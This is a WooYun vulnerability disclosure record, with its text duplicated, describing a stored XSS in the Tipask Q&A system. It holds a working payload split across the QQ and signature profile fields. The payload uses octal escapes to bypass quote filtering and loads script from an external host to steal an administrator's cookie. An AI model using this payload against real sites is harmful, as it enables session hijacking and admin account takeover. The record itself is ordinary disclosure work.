{"id": 41679, "wybug_id": "wooyun-2014-088000", "wybug_title": "tipask问答系统某处存储型xss（绕过限制）", "wybug_corp": "Tipask", "wybug_author": "Th1nk", "wybug_date": "2014-12-24 11:53", "wybug_open_date": "2015-03-24 11:54", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "黑盒测试技巧", "发生点上下文敏感"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： tipask问答系统某处存储型xss（绕过限制） 详细说明：  编辑个人资料时，QQ处没有过滤。http://127.0.0.1/tipask/tipask/?user/profile.html输入\"><h1>xx</h1>\n\n提交后自己查看\n\n别人查看\n\n但是QQ处长度有限制，导致我们不能形成xss。\n\n只能长15个字符，不够构造xss但是我发现用户可以编辑签名，长度在200字符以内，但是该处有限制。我们先看看输出。可以看到\n\n尖括号被过滤了。但是结合前面那个QQ处的bug，我们可以做出很多猥琐的事情~QQ处输入\n1\"><img src='\n这样就能构造后面所有的字符串都被包含在单引号里面了。然后构造签名处输入为\n' onerror=alert(1);//\n截图看效果。查看用户的个人资料，访问http://127.0.0.1/tipask/tipask/?u-5.html\n\n看一下源代码，经过浏览器渲染后的效果。\n\n光是弹出对话框还不够，我们还得能够打到用户的cookie什么的，包含外部js。一开始签名处使用的payload如下\n' onerror=eval('var b=document.createElement(\"script\");b.src=\"http://x58pw.sinaapp.com/WZ5U57\";(document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(b);');//\n\n\nonerror后面自动加上了双引号，并且我输入的双引号都被实体化成了&quot;，导致整个payload的引号混乱，根本不能完整闭合。所以说payload中不能出现双引号。于是想到js代码中允许用8字符串的进制编码于是\"-->\\42空格-->\\40最终构造出payload' \nonerror=eval('var\\40b=document.createElement(\\42script\\42);b.src=\\42http://x58pw.sinaapp.com/WZ5U57\\42;(document.getElementsByTagName(\\42HEAD\\42)[0]||document.body).appendChild(b);');//\n不使用onerror='alert(1)'这种格式的原因是还存在着小尾巴</span></i如果不放在js里面并且用//注释，也会导致整个payload不能运行。下面放测试截图，修改用户test的个人资料。QQ处输入\n1\"><img src='\n签名处输入\n' onerror=eval('var\\40b=document.createElement(\\42script\\42);b.src=\\42http://x58pw.sinaapp.com/WZ5U57\\42;(document.getElementsByTagName(\\42HEAD\\42)[0]||document.body).appendChild(b);');//\n然后使用admin账户登录查看test的个人资料。\n\n成功拿到cookie，使用该cookie可以登陆管理员后台。剩下的都懂。   漏洞证明：  编辑个人资料时，QQ处没有过滤。http://127.0.0.1/tipask/tipask/?user/profile.html输入\"><h1>xx</h1>\n\n提交后自己查看\n\n别人查看\n\n但是QQ处长度有限制，导致我们不能形成xss。\n\n只能长15个字符，不够构造xss但是我发现用户可以编辑签名，长度在200字符以内，但是该处有限制。我们先看看输出。可以看到\n\n尖括号被过滤了。但是结合前面那个QQ处的bug，我们可以做出很多猥琐的事情~QQ处输入\n1\"><img src='\n这样就能构造后面所有的字符串都被包含在单引号里面了。然后构造签名处输入为\n' onerror=alert(1);//\n截图看效果。查看用户的个人资料，访问http://127.0.0.1/tipask/tipask/?u-5.html\n\n看一下源代码，经过浏览器渲染后的效果。\n\n光是弹出对话框还不够，我们还得能够打到用户的cookie什么的，包含外部js。一开始签名处使用的payload如下\n' onerror=eval('var b=document.createElement(\"script\");b.src=\"http://x58pw.sinaapp.com/WZ5U57\";(document.getElementsByTagName(\"HEAD\")[0]||document.body).appendChild(b);');//\n\n\nonerror后面自动加上了双引号，并且我输入的双引号都被实体化成了&quot;，导致整个payload的引号混乱，根本不能完整闭合。所以说payload中不能出现双引号。于是想到js代码中允许用8字符串的进制编码于是\"-->\\42空格-->\\40最终构造出payload' \nonerror=eval('var\\40b=document.createElement(\\42script\\42);b.src=\\42http://x58pw.sinaapp.com/WZ5U57\\42;(document.getElementsByTagName(\\42HEAD\\42)[0]||document.body).appendChild(b);');//\n不使用onerror='alert(1)'这种格式的原因是还存在着小尾巴</span></i如果不放在js里面并且用//注释，也会导致整个payload不能运行。下面放测试截图，修改用户test的个人资料。QQ处输入\n1\"><img src='\n签名处输入\n' onerror=eval('var\\40b=document.createElement(\\42script\\42);b.src=\\42http://x58pw.sinaapp.com/WZ5U57\\42;(document.getElementsByTagName(\\42HEAD\\42)[0]||document.body).appendChild(b);');//\n然后使用admin账户登录查看test的个人资料。\n\n成功拿到cookie，使用该cookie可以登陆管理员后台。剩下的都懂。   修复方案：  qq既然是数字，为何不判断一下。   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}